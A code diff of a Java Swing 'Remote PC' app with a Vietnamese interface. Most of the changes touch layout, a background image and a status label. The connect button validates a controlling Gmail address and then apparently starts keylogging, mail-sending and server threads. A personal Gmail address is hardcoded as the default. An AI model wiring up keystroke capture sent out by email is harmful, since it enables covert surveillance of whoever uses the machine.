@@ -18,6 +18,8 @@ import java.util.List;
 import java.util.Timer;
 import java.util.TimerTask;
 import java.util.regex.Pattern;
+
+import javax.swing.ImageIcon;
 import javax.swing.JButton;
 import javax.swing.JFrame;
 import javax.swing.JLabel;
@@ -200,92 +202,108 @@ class CheckingThreading extends Thread {
 
 public class App {
 
-  public static void main(String[] args) {
-    int width = 400;
-    int height = 300;
-    final JFrame frame = new JFrame("Ứng dụng Swing");
-    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
-    frame.setSize(width, height);
-    Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
-    int x = (screenSize.width - width) / 2;
-    int y = (screenSize.height - height) / 2;
-    frame.setLocation(x, y);
-    Insets gap = new Insets(10, 30, 30, 30);
-    JPanel panel = new JPanel(new GridBagLayout());
-    GridBagConstraints constraints = new GridBagConstraints();
-    JLabel label = new JLabel("Nhập gmail điều khiển:");
-    final JTextField textField = new JTextField(20);
-    JButton connectButton = new JButton("Kết Nối");
-    JButton cancelButton = new JButton("Thoát");
-    constraints.fill = GridBagConstraints.HORIZONTAL;
-    constraints.gridx = 0;
-    constraints.gridy = 0;
-    constraints.gridwidth = 2;
-    constraints.insets = gap;
-    panel.add(label, constraints);
-    constraints.gridy = 1;
-    panel.add(textField, constraints);
-    constraints.fill = GridBagConstraints.HORIZONTAL;
-    constraints.gridy = 2;
-    constraints.gridwidth = 1;
-    panel.add(connectButton, constraints);
-    constraints.gridx = 1;
-    panel.add(cancelButton, constraints);
-    textField.setText("leminhquan19092004@gmail.com");
+    public static void main(String[] args) {
+        int width = 400;
+        int height = 300;
 
-    frame.add(panel);
-    frame.pack();
-    frame.setVisible(true);
-    connectButton.addActionListener(
-      new ActionListener() {
-        public void actionPerformed(ActionEvent e) {
-          System.out.println("Nội dung nhập: " + textField.getText());
-          String from = textField.getText();
-          if (from.equals("")) {
-            JOptionPane.showMessageDialog(
-              frame,
-              "Bạn chưa nhập gmail điều khiển",
-              "Lỗi",
-              JOptionPane.ERROR_MESSAGE
-            );
-          } else {
-            Pattern pattern = Pattern.compile("^[a-zA-Z0-9._%+-]+@gmail.com$");
-            if (!pattern.matcher(from).matches()) {
-              JOptionPane.showMessageDialog(
-                frame,
-                "Gmail không hợp lệ",
-                "Lỗi",
-                JOptionPane.ERROR_MESSAGE
-              );
-            } else {
-              textField.setText("ĐÃ KẾT NỐI");
-              KeyLog keylog = new KeyLog();
-              SendMail send = new SendMail(from);
-              ServerThreading server = new ServerThreading(keylog, send);
-              server.start();
-              CheckingThreading checking = new CheckingThreading(from);
-              checking.start();
+        final JFrame frame = new JFrame("Ứng dụng Remote PC");
+        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
+        frame.setSize(width, height);
+
+        ImageIcon backgroundImage = new ImageIcon("./image/background.png");
+        JLabel backgroundLabel = new JLabel(backgroundImage);
+        backgroundLabel.setBounds(0, 0, width, height);
+
+        String status = "Chưa kết nối";
+        JLabel statusLabel = new JLabel("Trạng thái: " + status);
+
+        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
+        int x = (screenSize.width - width) / 2;
+        int y = (screenSize.height - height) / 2;
+        frame.setLocation(x, y);
+
+        Insets gap = new Insets(10, 30, 30, 30);
+        JPanel panel = new JPanel(new GridBagLayout());
+        GridBagConstraints constraints = new GridBagConstraints();
+        JLabel label = new JLabel("Nhập gmail điều khiển:");
+        final JTextField textField = new JTextField(20);
+        JButton connectButton = new JButton("Kết Nối");
+        JButton cancelButton = new JButton("Thoát");
+
+        
+        //constraints.fill = GridBagConstraints.HORIZONTAL;
+        constraints.gridx = 0;
+        constraints.gridy = 0;
+        constraints.gridwidth = 2;
+        constraints.insets = gap;
+        panel.add(label, constraints);
+        constraints.gridy = 1;
+        panel.add(textField, constraints);
+        //constraints.fill = GridBagConstraints.HORIZONTAL;
+        constraints.gridy = 2;
+        constraints.gridwidth = 1;
+        panel.add(connectButton, constraints);
+        constraints.gridx = 1;
+        panel.add(cancelButton, constraints);
+        textField.setText("leminhquan19092004@gmail.com");
+
+        constraints.gridy = 3; 
+        constraints.gridx = 0;
+        constraints.gridwidth = 2;
+        panel.add(statusLabel, constraints);
+        panel.add(backgroundLabel);
+
+        frame.add(panel);
+        frame.pack();
+        frame.setVisible(true);
+
+        connectButton.addActionListener(new ActionListener() {
+            public void actionPerformed(ActionEvent e) {
+                System.out.println("Nội dung nhập: " + textField.getText());
+                String from = textField.getText();
+                if (from.equals("")) {
+                    JOptionPane.showMessageDialog(
+                        frame,
+                        "Bạn chưa nhập gmail điều khiển",
+                        "Lỗi",
+                        JOptionPane.ERROR_MESSAGE
+                    );
+                } else {
+                    Pattern pattern = Pattern.compile("^[a-zA-Z0-9._%+-]+@gmail.com$");
+                    if (!pattern.matcher(from).matches()) {
+                        JOptionPane.showMessageDialog(
+                            frame,
+                            "Gmail không hợp lệ",
+                            "Lỗi",
+                            JOptionPane.ERROR_MESSAGE
+                        );
+                    } else {
+                        textField.setText("ĐÃ KẾT NỐI");
+                        KeyLog keylog = new KeyLog();
+                        SendMail send = new SendMail(from);
+                        ServerThreading server = new ServerThreading(keylog, send);
+                        server.start();
+                        CheckingThreading checking = new CheckingThreading(from);
+                        checking.start();
+                    }
+                }
             }
-          }
-        }
-      }
-    );
+        });
 
-    cancelButton.addActionListener(
-      new ActionListener() {
-        public void actionPerformed(ActionEvent e) {
-          int choice = JOptionPane.showConfirmDialog(
-            frame,
-            "Bạn có chắc muốn thoát ứng dụng?",
-            "Xác nhận",
-            JOptionPane.YES_NO_OPTION
-          );
+        cancelButton.addActionListener(new ActionListener() {
+            public void actionPerformed(ActionEvent e) {
+                int choice = JOptionPane.showConfirmDialog(
+                    frame,
+                    "Bạn có chắc muốn thoát ứng dụng?",
+                    "Xác nhận",
+                    JOptionPane.YES_NO_OPTION
+                );
 
-          if (choice == JOptionPane.YES_OPTION) {
-            System.exit(0);
-          }
-        }
-      }
-    );
-  }
+                if (choice == JOptionPane.YES_OPTION) {
+                    System.exit(0);
+                }
+            }
+        });
+    }
 }
+
